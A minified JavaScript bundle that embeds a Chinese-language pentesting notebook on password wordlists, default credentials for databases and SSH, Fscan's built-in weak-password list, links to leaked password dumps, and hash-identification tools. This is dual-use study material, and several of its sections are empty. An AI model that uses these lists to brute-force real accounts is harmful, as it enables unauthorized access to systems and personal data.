896",focusable:"false"},children:[{tag:"path",attrs:{d:"M696 480H328c-4.4 0-8 3.6-8 8v48c0 4.4 3.6 8 8 8h368c4.4 0 8-3.6 8-8v-48c0-4.4-3.6-8-8-8z"}},{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"}}]},name:"minus-circle",theme:"outlined"},j=l,n=f("6VBw"),u=function(m,F){return h.createElement(n.a,Object(R.a)(Object(R.a)({},m),{},{ref:F,icon:j}))};u.displayName="MinusCircleOutlined";var t=U.a=h.forwardRef(u)},"yEy/":function(nu,U,f){"use strict";f.r(U),f.d(U,"\u5E38\u7528\u8BCD\u5178_Helper",function(){return m}),f.d(U,"\u8BCD\u5178_\u5BC6\u7801_\u53E3\u4EE4_\u7F16\u7801_\u7206\u7834_\u624B\u518C",function(){return k});var R=f("fWQN"),h=f("q1tI"),l=f.n(h),j=f("/qoP"),n=f("ysNt"),u=f("AkKX"),t=f("FOD2"),s=n.e.singleATag_blank,m=function o(){Object(R.a)(this,o)};m.HTB_\u63D0\u4F9B\u8BCD\u5178=`
          HTB_\u63D0\u4F9B\u8BCD\u5178


                          "/usr/share/wordlists"                                \uFF08\u8FD9\u4E2A\u4F3C\u4E4E\u66F4\u597D\u7528\uFF09

                              /dirb

                                  /common.txt

                              /dirbuster

                                  /directory-list-2.3-small.txt



                          "/home/htb-hanshou101/Desktop/Useful Repos/SecLists"  \uFF08\u6709\u65F6\u5019\uFF0C\u5C0F\u8BCD\u5178\u641C\u4E0D\u5230\u4E1C\u897F\uFF09

                              /Discovery                                        (\u76EE\u5F55\u7206\u7834\uFF0C\u63A2\u7D22\u722C\u866B)

                                  /Web-Content                                  (\u7F51\u7AD9\u76EE\u5F55)

                                      \u3010\u901A\u7528\u3011
                                          /common.txt
                                      \u3010PHP\u3011
                                          /SVNDigger/cat/Language/php.txt
                                          /PHP.fuzz.txt
                                          /CMS/php-nuke.fuzz.txt
                                      \u3010JSP\u3011
                                          /SVNDigger/cat/Language/jsp.txt



                          "/usr/share/wordlists"

                              /rockyou.txt

                                  \uFF08\u5E38\u7528\u4E8E\u672C\u5730\u5BC6\u7801\u7206\u7834\uFF0C\u5982zip\u5305\uFF09
                                  \u6BD4\u5982\u7528\u3010john\u3011\u5DE5\u5177\uFF0C\u89C1\u300A\u300B

  `;var F={name:"\u3010\u8BCD\u5178\u3011_\u3010\u5BC6\u7801\u3011_\u3010\u53E3\u4EE4\u3011_\u3010\u7F16\u7801\u3011_\u3010\u7206\u7834\u3011_\u624B\u518C",desc:l.a.createElement(l.a.Fragment,null,u.a.\u4E0D\u4E8C\u6B21\u72AF\u9519_KEY.\u679A\u4E3E_\u539F\u7406_\u751F\u6548\u672C\u8D28),steps:[{name:"\u672C\u8D28\u548C\u601D\u8DEF",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u91CD\u8981\u601D\u8DEF\u6587\u732E\uFF1A
                  \uFF082014\u5E74\u6587\u7AE0\uFF09\u5B89\u5168\u8FD0\u8425\uFF1A\u5F31\u53E3\u4EE4\uFF0C\u4F01\u4E1A\u5B89\u5168\u7684\u575F\u5893 | | \u5B89\u4E91\u7F51 \u2013 AnYun.ORG
                      https://anyun.org/a/seayxinxianquanboke/2017/0213/8572.html

          \u5E38\u89C1\u5BC6\u7801\u5F62\u5F0F\uFF1A
                  \u2460 \u5E38\u7528\u7B80\u5355\u6570\u5B57\u3001\u5B57\u6BCD
                      \u8FD9\u7C7B\u4E2D\u6700\u5178\u578B\u7684\u4E00\u4E2A\u5BC6\u7801\u5C31\u662F123456\uFF0C\u5728\u6536\u96C6\u5230\u76EE\u6807\u7CFB\u7EDF\u7684\u7528\u6237\u540D\u5217\u8868\u540E\uFF0C\u7528\u8FD9\u4E2A\u5BC6\u7801\u8FDB\u884C\u7206\u7834\u5C61\u8BD5\u4E0D\u723D\u3002
                      \u56E0\u4E3A\u8FD9\u4E32\u6570\u5B57\u6700\u597D\u8BB0\uFF0C\u800C\u4E14\u5728\u5F88\u591AIT\u8BFE\u5802\u4E0A\uFF0C\u5F88\u591A\u8001\u5E08\u76F4\u63A5\u547D\u4EE4\u5B66\u751F\u628A\u6570\u636E\u5E93\u7B49\u5BC6\u7801\u8BBE\u7F6E\u4E3A123456\uFF0C\u6211\u5728\u91CD\u5E86\u8BFB\u4E66\u7684\u65F6\u5019\u5BF9\u8FD9\u4E2A\u6DF1\u6709\u4F53\u4F1A\uFF0C\u8FD9\u662F\u4ECE\u6700\u5F00\u59CB\u5C31\u517B\u6210\u7684\u574F\u4E60\u60EF\u3002

                  \u2461 \u4E2A\u4EBA\u4FE1\u606F\uFF1A\u751F\u65E5\u3001\u540D\u5B57\u62FC\u97F3\u7F29\u5199\u3001ID\u3001QQ\u3001\u624B\u673A
                      \u8FD9\u4E00\u7C7B\u5C5E\u4E8E\u4E2A\u4EBA\u4FE1\u606F\u62FC\u63A5\u7684\u5BC6\u7801\uFF0C\u5F88\u591A\u4EBA\u4E3A\u4E86\u5BC6\u7801\u597D\u8BB0\uFF0C\u5C31\u4F1A\u628A\u201C\u540D\u5B57\u62FC\u97F3\u7F29\u5199+\u751F\u65E5\u201D\u5F53\u6210\u81EA\u5DF1\u7684\u5E38\u7528\u5BC6\u7801\uFF0C\u751A\u81F3\u6709\u5F88\u591A\u76F4\u63A5\u7528\u624B\u673A\u53F7\u3001QQ\u53F7\u4F5C\u4E3A\u5BC6\u7801\u3002

                      \u5BF9\u4E8E\u8FD9\u79CD\uFF0C\u53EA\u8981\u5BF9\u76EE\u6807\u8FD9\u4E2A\u4EBA\u8FDB\u884C\u4E00\u70B9\u7B80\u5355\u7684\u4FE1\u606F\u6536\u96C6\u5373\u53EF\u3002
                          \u4E3E\u4F8B\uFF1A\u9A6C\u4E91\u4EE5\u524D\u7684\u5BC6\u7801\u53EF\u80FD\u5C31\u662F\u4E0B\u9762\u5176\u4E2D\u4E00\u4E2A
                              mayun1234
                              mayun19641015
                              my19641015
                              19641015

                  \u2462 \u57DF\u540D\u3001\u4E2D\u6587\u6216\u82F1\u6587\u540D\u79F0\u6216\u52A0\u6570\u5B57\u3001\u5B57\u6BCD\u3001IP\u5C3E\u6570\u5B57
                      \u8FD9\u7C7B\u4E5F\u662F\u975E\u5E38\u5E38\u89C1\u7684\u4E00\u79CD\uFF0C\u5F88\u591A\u4F01\u4E1A\u5458\u5DE5\u4F1A\u628A\u4E00\u4E9B\u6570\u636E\u5E93\u3001FTP\u3001\u751A\u81F3ssh\u5BC6\u7801\u8BBE\u7F6E\u6210\u81EA\u5DF1\u516C\u53F8\u7684\u57DF\u540D\u524D\u7F00\u6216\u8005\u516C\u53F8\u4E2D\u6587\u540D\u79F0\u62FC\u97F3\u7B49
                          \u6BD4\u5982\u767E\u5EA6\u7684\u5458\u5DE5\u53EF\u80FD\u4F1A\u628A\u5BC6\u7801\u8BBE\u7F6E\u6210\u201Cbaidu\u201D\uFF0C\u56E0\u4E3A\u767E\u5EA6\u7684\u57DF\u540D\u548C\u4E2D\u6587\u62FC\u97F3\u90FD\u662F\u8FD9\u4E2A\uFF0C\u90A3\u8FD9\u4E2A\u5BC6\u7801\u7684\u51FA\u73B0\u6982\u7387\u5C31\u66F4\u9AD8\u4E86\u3002

                      \u8FD8\u6709\u5F88\u591A\u6709\u8DA3\u7684\u5BC6\u7801\u50CF\u201Cbaidu123\u201D\u3001\u201Cbaidu2014\u201D\uFF0CIP\u4E3A10.0.0.39\u7684ssh\u5BC6\u7801\u4E3A\u201Cbaidu39\u201D\u6216\u8005\u66F4\u590D\u6742\u70B9\uFF0C\u4F46\u662F\u6709\u89C4\u5F8B\uFF0C\u8FD9\u4E00\u79CD\u4E5F\u975E\u5E38\u5E38\u89C1\u3002
                      \u5EFA\u8BAE\u5728\u6E17\u900F\u6D4B\u8BD5\u8FC7\u7A0B\u4E2D\u591A\u6574\u7406\u8FD9\u6837\u7684\u5BC6\u7801\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u5F80\u5F80\u90FD\u4F1A\u6709\u60CA\u559C\u54E6\u3002

          \u5E38\u89C1\u5DEE\u5F02\uFF1A

                  \u4E0D\u540C\u4EA7\u54C1\u7684\u4F7F\u7528\u8005\u4EBA\u7FA4\u3001\u4E13\u4E1A\u6027\u5BFC\u81F4\u7684\u4E0D\u540C\u4E60\u60EF
                          \u524D\u7AEF\u666E\u901A\u7528\u6237\u3001Admin\u7BA1\u7406\u7528\u6237\u3001\u5F00\u53D1\u4EBA\u5458

                          \u8FD0\u7EF4\u4EBA\u5458\u3001\u9ED1\u5BA2\u4EBA\u5458

                  \u4E0D\u540C\u56FD\u5BB6\u3001\u4E0D\u540C\u79CD\u65CF\u3001\u4E0D\u540C\u59D3\u540D

                  \u4E0D\u540C\u5E74\u9F84\u5C42\u3001\u63A5\u89E6\u7684\u4E0D\u540C\u6D41\u884C\u6587\u5316



          `))},{name:"\u5C0F\u800C\u7CBE\u2014\u2014\u2014\u2014\u81EA\u5DF1\u624B\u5DE5\u5236\u4F5C   \uFF08\u7F51\u4E0A\u6CA1\u6709\u5C0F\u800C\u7CBE\u7684\uFF0C\u9664\u4E86Fscan\uFF09",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u81EA\u5DF1\u3010\u624B\u5DE5\u5236\u4F5C\u8BCD\u5178\u3011",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u601D\u8DEF\u548C\u5B9E\u73B0",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          \u2460 \u901A\u8FC7\u5BF9\u3010\u62D6\u5E93\u6570\u636E\u3011\u3001\u3010\u5927\u5382\u6CC4\u9732\u3011\uFF0C\u8FDB\u884C\u3010\u5206\u6790\u3011\u3001\u3010\u7EDF\u8BA1\u3011
                  \u6765\u6E90\uFF1A
                          \u5404\u5927Web\u5382\u5546

                          \u5927\u91CF\u6570\u636E\u6CC4\u9732\uFF1A
                                  \u6D77\u5916\uFF1A
                                      \u8FD9\u4E2A\u7AD9\uFF0C\u6D77\u5916\u6BD4\u8F83\u6743\u5A01\uFF1Ahttps://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
                                  \u56FD\u5185\uFF1A
                                      \u964C\u964C\u76F8\u5173\u7684\u5BC6\u7801\u6CC4\u9732\uFF1A
                                          2015\u964C\u964C\u5BC6\u7801\u6570\u636E.7z\uFF1A    https://github.com/evilmt/Password-top-statistics-tool/blob/master/\u793A\u4F8B\uFF1A2015\u964C\u964C\u5BC6\u7801\u6570\u636E.7z

                                      \u4EAC\u4E1C\uFF1A
                                          \u53EA\u6709\u4E00\u90E8\u5206\uFF1A
                                                  \u81EA\u5236\u5F31\u53E3\u4EE4\u8BCD\u5178top100 | \u56DE\u5FC6\u98D8\u5982\u96EA       https://gv7.me/articles/2017/making-the-password-top-100/

                          \u5236\u4F5C\u65B9\u6CD5\uFF1A
                                  \u4F7F\u7528NaviCat+MySQL\uFF1A
                                      mysql\u5F31\u53E3\u4EE4\u8BCD\u5178_\u81EA\u5236\u5F31\u53E3\u4EE4\u8BCD\u5178top100_zLiM5\u7684\u535A\u5BA2-CSDN\u535A\u5BA2
                                          https://blog.csdn.net/weixin_30851261/article/details/113201861


                  \u573A\u666F\uFF1A
                          \u591A\u534A\u662F\u3010\u666E\u901AWeb\u7528\u6237\u3011\u7684\u4E60\u60EF\u6570\u636E\u3002
                              \u4E0D\u5305\u62EC  \u3010\u6570\u636E\u5E93\u3011\u3001\u3010Admin\u7528\u6237\u3011  \u7B49\u3002



          \u2461 \u81EA\u5DF1\u4ECE\u3010\u7F51\u4E0A\u641C\u96C6\u6574\u5408\u3011\u3002    \uFF08\u5F88\u5C11\uFF0C\u6709\u9047\u5230\uFF0C\u4E00\u4EFD\u5B8C\u6574\u7684\u3001\u62FF\u6765\u5C31\u80FD\u7528\u7684\uFF09
                  \u6765\u6E90\uFF1A
                          \u5404\u5927\u5382\u5546\uFF0C\u7ECF\u5E38\u62AB\u9732\u7684  \u3001\u65B0\u53D1\u5E03\u7684
                                  \uFF08\u4E2A\u4EBA\u503E\u5411\u8BA4\u4E3A\uFF0C\u8FD9\u4E9B\u4E5F\u662F  \u3010\u62D6\u5E93\u6570\u636E\u3011\u62FF\u6765\u7684  \uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF09



          `))},{name:"\u73B0\u6210\u5DE5\u5177",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u57FA\u4E8E\u3010\u5DF2\u6709\u8BCD\u5178\u3011\uFF0C\u8FDB\u884C\u3010\u53D8\u79CD\u3011\u3001\u3010\u7B5B\u9009\u3011\u3001\u3010\u7EC4\u5408\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                  \u601D\u8DEF\u4E00\uFF1A\u5229\u7528\u3010\u5DF2\u6709\u8BCD\u5178\u3011\uFF0C\u8FDB\u884C\u7B5B\u9009\u5B57\u7B26\u4E32\uFF0C\u6765\u7B80\u5355\u751F\u6210\u3010\u5B50\u8BCD\u5178\u3011

                          grep  -i  ninja  /usr/share/wordlists/rockyou.txt  >  rockyou_ninja
                                  \u5728\u3010rockyou.txt\u3011\u6587\u4EF6\u4E2D\uFF0C\u67E5\u627E\u3010\u5305\u542Bninja\u3011\u7684\u90E8\u5206\u3002  \u7136\u540E\u751F\u6210\u65B0\u7684\u3010\u5B50\u8BCD\u5178\u3011


                  \u601D\u8DEF\u4E8C\uFF0C\u4F7F\u7528\u3010\u7528\u6237\u4FE1\u606F\u788E\u7247\u3011\u3002\u6765\u5236\u4F5C  \u5B50\u5B57\u5178\u3002

                          \u5BC6\u7801\u5B57\u5178\u751F\u6210\u5668|mayter.cn
                                  \u5730\u5740\uFF1Ahttps://www.shentoushi.top/tools/dict/index.php
                                  \u8D44\u6599\uFF1A
                                          \u5229\u7528\u4EBA\u7684\u5BC6\u7801\u4E60\u60EF \u7CBE\u51C6\u5206\u6790\u5BC6\u7801
                                          \u8F93\u5165\u76EE\u6807\u4FE1\u606F \u731C\u6D4B\u53EF\u80FD\u4F7F\u7528\u7684\u5BC6\u7801
                                                  \u59D3\u540D  \u90AE\u7BB1  \u751F\u65E5  \u7528\u6237\u540D
                                                  \u7279\u6B8A\u6570\u5B57  \u5E38\u7528\u5BC6\u7801  \u4F34\u4FA3\u4FE1\u606F  \u624B\u673A\u53F7\u7801


          `))},{name:"\u901A\u8FC7\u3010Fuzz\u3011\u3001\u3010\u968F\u673A\u7EC4\u5408\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


                  \u601D\u8DEF\u4E00\uFF1A\u4F7F\u7528\u3010radamsa\u3011\uFF0C\u6765\u751F\u6210\u3010\u7279\u5B9A\u8BCD\u5178\u3011

                          \u53C2\u8003\u8D44\u6599\uFF1Ahttps://gitlab.com/akihe/radamsa
                          \u4ECB\u7ECD\uFF1A
                                  \u751F\u6210\u3010\u968F\u673A\u8BCD\u5178\u3011\u548C\u3010\u6D4B\u8BD5\u7528\u4F8B\u3011\u3002
                                  \u53C8\u53EB\u505A\u3010\u6A21\u7CCA\u5668 / fuzzer\u3011\u3002
                          \u4F7F\u7528\uFF1A
                                  radamsa --seed $FFUF_NUM example1.txt example2.txt
                                          \u5728\u3010ffuf\u3011\u4E2D\u4F7F\u7528\u3002
                                  radamsa -n 1000 -o %n.txt example1.txt example2.txt
                                          \u5355\u72EC\u4F7F\u7528\u3002

          `))}]}]},{name:"\u4E13\u9879\u8BCD\u5178\u2014\u2014\u4E13\u4E1A\u9886\u57DF\u8BCD\u5178  \uFF08MySQL\u3001SSH \u7B49\uFF09",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u6570\u636E\u5E93 / \u7F13\u5B58 / \u4E8B\u4EF6\u961F\u5217",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"MySQL",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      \u7528\u6237\u540D:
                      root

                      \u5BC6\u7801\uFF1A
                      123456


                      `))},{name:"PostGreSQL",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      \u7528\u6237\u540D\uFF1A
                      postgres

                      \u5BC6\u7801\uFF1A
                      123456

                      `))},{name:"Redis",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      \u7528\u6237\u540D\uFF1A
                      \uFF08\u65E0\u5BC6\u7801\uFF09

                      \u5BC6\u7801\uFF1A
                      \uFF08\u65E0\u5BC6\u7801\uFF09

                      `))},{name:"MongoDB",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      \u7528\u6237\u540D\uFF1A
                      \uFF08\u65E0\u5BC6\u7801\uFF09

                      \u5BC6\u7801\uFF1A
                      \uFF08\u65E0\u5BC6\u7801\uFF09

                      `))},{name:"Oracle",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      \u7528\u6237\u540D\uFF1A
                      test

                      \u5BC6\u7801\uFF1A
                      test


                      `))}]},{name:"OS\u64CD\u4F5C\u7CFB\u7EDF",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"Linux / SSH",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      SSH
                          \u8D44\u6599\uFF1A
                              (\u5728\u8FD9\u6BB5\u7684\u672B\u5C3E)\uFF1Ahttps://www.cnblogs.com/bonelee/p/9322684.html   \uFF08\u641C\u3010\u5B8C\u6574\u7684\u5BC6\u7801\u5217\u8868\u3011\uFF09
                              \u539F\u59CB\u94FE\u63A5\u5931\u6548\uFF0C\u8865\u4E0A\u65B0\u94FE\u63A5\uFF1Ahttps://github.com/dipsec/Achilles/blob/master/hasla/sshd_bruteforce_list.txt

                      \u7528\u6237\u540D\uFF1A
                          admin

                          \u9ED8\u8BA4\u81EA\u5E26
                              root

                          \u5E38\u89C1
                              www

                      \u5BC6\u7801\uFF1A
                          123456
                          P@ssw0rd

                      `))},{name:"Windows / \u8FDC\u7A0B\u684C\u9762",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
                      \u7528\u6237\u540D\uFF1A
                          \u9ED8\u8BA4\u81EA\u5E26
                              Administrator
                      `))}]},{name:"Web\u4E1A\u52A1\u7CFB\u7EDF",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"Admin\u540E\u53F0\u7CFB\u7EDF",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u793E\u4EA4\u5E73\u53F0 / \u793E\u4EA4\u7F51\u7EDC",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u7535\u5546\u5E73\u53F0",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"QQ\u817E\u8BAF / \u5FAE\u4FE1",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u7535\u5B50\u90AE\u7BB1",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u624B\u673A\u53F7\u51ED\u8BC1",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))}]}]},{name:"\u3010\u5E38\u89C1\u7528\u6237\u540D\u3011\u3001\u9AD8\u9891\u3010\u5F31\u5BC6\u7801\u3011\u3001\u3010\u5F31\u53E3\u4EE4\u3011",desc:l.a.createElement(l.a.Fragment,null),content:function(){var o=function(b){return l.a.createElement("li",{key:b},b)};return l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1A
                  \u7F51\u4E0A\uFF0C\u6700\u9AD8\u9891\u7684\u5F31\u5BC6\u7801
                      \u6743\u5A01\uFF1A
                          Most Common Passwords 2022 - Is Yours on the List? | CyberNews
                              https://cybernews.com/best-password-managers/most-common-passwords/

                      \u7F51\u4E0A\u6D41\u9732\u4E8E \u4E2D\u6587\u7F51\u7EDC\u7684\uFF1A
                          2018\u5F31\u5BC6\u7801TOP 100 - \u4EE3\u7801\u5148\u950B\u7F51
                              https://www.codeleading.com/article/1040284518/

          \u7528\u6237\u540D\uFF1A
                  admin
                  test

                  \u7F51\u4E0A\uFF0C\u522B\u4EBA\u7ECF\u5E38\u7528\u7684\uFF0C\u5E38\u89C1\u7528\u6237\u540D\uFF1A
                      administrator

          \u5BC6\u7801\uFF1A
                  \u4E2A\u4EBA\u6536\u96C6\u7684\u4E00\u4E9B\uFF0C\u5E38\u89C1\u5F31\u5BC6\u7801\uFF1A
                          admin
                          admin123
                          123456
                          admin666
                          admin888
                          admin789

                  888888
                  test

                  \u7F51\u4E0A\uFF0C\u522B\u4EBA\u7ECF\u5E38\u7528\u7684\uFF0C\u5E38\u89C1\u5F31\u5BC6\u7801\uFF1A
                          admin
                          administrator
                          password
                          123456789
                          qwerty
                          12345
                          qwerty123
                          1q2w3e
                          12345678
                          111111
                          1234567890


          `))}()}]},{name:"\u5927\u800C\u5168\u2014\u2014\u2014\u2014\u3010\u7F51\u4E0A\u8BCD\u5178\u3011   \uFF08\u7F51\u4E0A\u6CA1\u6709\u5C0F\u800C\u7CBE\u7684\uFF0C\u9664\u4E86Fscan\uFF09",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          Fscan\uFF0C\u81EA\u5E26\u3010\u5C0F\u800C\u7CBE\u3011\u8BCD\u5178\u5E93\u3002
                  \u5305\u542B\u3010\u4E2D\u95F4\u4EF6\u3011\uFF1A
                          ftp
                                  {"ftp", "admin", "www", "web", "root", "db", "wwwroot", "data"},
                          mysql
                                  {"root", "mysql"},
                          mssql
                                  {"sa", "sql"},
                          smb
                                  {"administrator", "admin", "guest"},
                          rdp
                                  {"administrator", "admin", "guest"},
                          postgresql
                                  {"postgres", "admin"},
                          ssh
                                  {"root", "admin"},
                          mongodb
                                  {"root", "admin"},
                          oracle
                                  {"sys", "system", "admin", "test", "web", "orcl"},

                  \u5E38\u89C1\u5BC6\u7801        \uFF08\u6B64\u5904\u9700\u8981\u6CE8\u610F\uFF0C\u7528\u5230\u4E86  \u3010\u52A8\u6001\u62FC\u63A5\u3011+\u3010\u7528\u6237\u540D\u3011  \u7684\u64CD\u4F5C\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF09

                          {"123456", "admin", "admin123", "root", "", "pass123", "pass@123", "password", "123123", "654321",
                          "111111", "123", "1", "admin@123", "Admin@123", "admin123!@#", "{user}", "{user}1", "{user}111",
                          "{user}123", "{user}@123", "{user}_123", "{user}#123", "{user}@111", "{user}@2019", "{user}@123#4",
                          "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe", "123qwe!@#",
                          "123456789", "123321", "666666", "a123456.", "123456~a", "123456!a", "000000", "1234567890", "8888888",
                          "!QAZ2wsx", "1qaz2wsx", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.",
                          "Aa12345", "a123456", "a123123", "Aa123123", "Aa123456", "Aa12345.", "sysadmin", "system", "1qaz!QAZ",
                          "2wsx@WSX", "qwe123!@#", "Aa123456!", "A123456s!", "sa123456", "1q2w3e", "Charge123", "Aa123456789"}


          \u5404\u4E2A\u6A21\u5757\uFF0C\u5404\u4E2ACMS\uFF0C\u81EA\u5E26\u7684\u4E00\u4E9B\u9ED8\u8BA4\u5BC6\u7801\u3001\u9ED8\u8BA4\u51ED\u8BC1\uFF1A

                          \u6211\u60F3\u4E86\u4E00\u4E0B\uFF0C\u8FD8\u662F\u5206\u6563\uFF0C\u653E\u5230\u3010\u5177\u4F53\u6A21\u5757\u3011\u91CC\u5427

                          \u4F8B\u5982\uFF1A
                              Tomcat
                              PRTG
                              Netmon
                              Magento
                              UniFi
                              Jenkins
                              RDP
                              SMB
                              \u2026\u2026\u2026\u2026\u7B49\u7B49


          \u7EFC\u5408\u3010\u8BCD\u5178\u6E05\u5355\u3011

                          \u9AD8\u4EF7\u503C\uFF1A
                              \u3010@danielmiessler\u2019s SecLists\u3011\uFF0C\u5305\u542B\u4E86\u6781\u591A\u7684\u8BCD\u5178\u6536\u96C6\uFF0C\u4E5F\u6BD4\u8F83\u7ECF\u5178\uFF1Ahttps://github.com/danielmiessler/SecLists

                          \u4E2D\u4EF7\u503C\uFF1A
                              \u5404\u79CD\u8BCD\u5178\u7684\u7C7B\u578B\uFF0C\u7B80\u5355\u7684\u4E00\u4E2A\u641C\u7F57\uFF1Ahttps://www.cnblogs.com/bonelee/p/9323488.html



          HTB             `.concat(m.HTB_\u63D0\u4F9B\u8BCD\u5178,`







          `)))},{name:"\u3010\u5BC6\u7801\u7834\u89E3\u3011",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u786E\u5B9A\u3010\u52A0\u5BC6\u7C7B\u578B\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u52A0\u5BC6\u7C7B\u578B\u4ECB\u7ECD\uFF1A
                  \u3010Hash\u51FD\u6570\u3011
                      \u53C8\u79F0\u3010\u6563\u5217\u51FD\u6570\u3011\u3002
                      \u5305\u62EC\uFF1A
                          \u53C2\u8003\u8D44\u6599\uFF1Ahttps://zh.wikipedia.org/wiki/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B8

                          HAVAL\u3001
                          MD2\u3001MD4\u3001MD5\u3001
                          PANAMA\u3001RadioGat\xFAn\u3001
                          RIPEMD\u3001RIPEMD-128/256\u3001RIPEMD-160/320\u3001
                          SHA-0\u3001SHA-1\u3001SHA-256/224\u3001SHA-512/384\u3001
                          Tiger\uFF082\uFF09-192/160/128\u3001WHIRLPOOL\u3001


              \u786E\u5B9A\u3010hash\u503C\u3011\u7C7B\u578B

                  \u547D\u4EE4\uFF1A

                      hashid

                          hashid  <\u5177\u4F53hash\u503C>
                              \u7ED3\u679C\u4E2D\uFF0C\u4F1A\u7ED9\u51FA\u4E00\u4E9B\u3010\u53EF\u80FDhash\u7C7B\u578B\u3011\u7684\u731C\u6D4B

                      123

                  \u5DE5\u5177

                      123

              \u786E\u5B9A 123

              `))},{name:"\u300A\u5728\u7EBF\u7F51\u7AD9\u300B\u2014\u2014\u3010MD5\u52A0\u5BC6\u3011\u53CD\u67E5\u3001",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              MD5\u52A0\u5BC6\u53CD\u67E5
                  crackstation.net

              MD5\u52A0\u5BC6\u89E3\u5BC6_\u5929\u5929\u67E5\u8BE2
